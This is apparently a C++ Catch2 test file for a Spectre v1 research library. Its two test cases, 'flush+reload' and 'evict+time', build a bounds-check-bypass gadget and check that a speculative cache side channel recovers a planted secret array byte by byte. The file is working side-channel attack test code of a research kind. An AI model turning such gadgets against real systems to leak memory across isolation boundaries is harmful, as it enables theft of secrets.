//
// Created by sage on 1/14/21.
//

#include <catch2/catch.hpp>
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>
// gdb -batch -ex 'file CacheCash' -ex 'disassemble /r main'

#define BLOCK_LEN 64
#define PAGE_SIZE 4096
#define MAX_TRIES 1000

TEST_CASE("flush+reload", "[spectre1]")
{
    unsigned int array1_size = 16;
    uint8_t unused[64]; // seperate by a cacheline
    uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
    uint8_t unused1[64]; // seperate by a cacheline
    static uint8_t array2[MAX_BYTE*BLOCK_LEN];
    uint8_t unused2[64] = {3};
    uint8_t secret[25] = {0xff, 0xfe, 0xfd, 0xde, 0xad, 0xbe, 0xef, 0x69, 'T', 'h', 'e', ' ', 'c', 'a', 'k', 'e'};

    auto f_get_elem = [&](size_t x)
    {
        // Make this volatile or compiler might optimize out
        volatile uint8_t res;
        if (x < array1_size )
        {
            res = array2[array1[x]*BLOCK_LEN];
        }
        return res;
    };

    Spectrev1 s(array1,
                array2,
                [&](volatile size_t x){flush(&array1_size); f_get_elem(x);},
                [](size_t _t){return _t%16;},
                BLOCK_LEN,
                MAX_TRIES/4,
                13
    );
    // Need to make sure every page of array2 is backed
    for (auto i = 0; i < BLOCK_LEN*MAX_BYTE; i += PAGE_SIZE)
    {
        array2[i] = 1;
    }

    uint8_t val;
    for (size_t i = 0; i < 25; ++i)
    {
        s.read_byte(&secret[i], &val);
        REQUIRE(val == secret[i]);
    }
}

TEST_CASE("evict+time", "[spectre1]")
{
    unsigned int array1_size = MAX_BYTE;
    uint8_t _unused1[64];
    uint8_t array1[MAX_BYTE];
    uint8_t _unused2[64];
    static uint8_t array2[MAX_BYTE*BLOCK_LEN];
    uint8_t _unused3[64] = {3};
    uint8_t secret[25] = {0xff, 0xfe, 0xfd, 0xde, 0xad, 0xbe, 0xef, 0x69, 'T', 'h', 'e', ' ', 'c', 'a', 'k', 'e'};
    for (auto i = 0; i < MAX_BYTE; ++i)
    {
        array1[i] = i;
    }

    auto f_get_elem = [&](size_t x)
    {
        volatile uint8_t res;
        if (x < array1_size )
        {
            res = array2[array1[x]*BLOCK_LEN];
        }
        return res;
    };

    Spectrev1 s(array1,
                array2,
                [&](volatile size_t x){flush(&array1_size); f_get_elem(x);},
                [](size_t _t){return _t%MAX_BYTE;},
                BLOCK_LEN,
                MAX_TRIES/4,
                13
    );
    // Need to make sure every page of array2 is backed
    for (auto i = 0; i < BLOCK_LEN*MAX_BYTE; i += PAGE_SIZE)
    {
        array2[i] = 1;
    }

    uint8_t val;
    for (size_t i = 0; i < 25; ++i)
    {
        s.read_byte(&secret[i], &val);
        REQUIRE(val == secret[i]);
    }
}
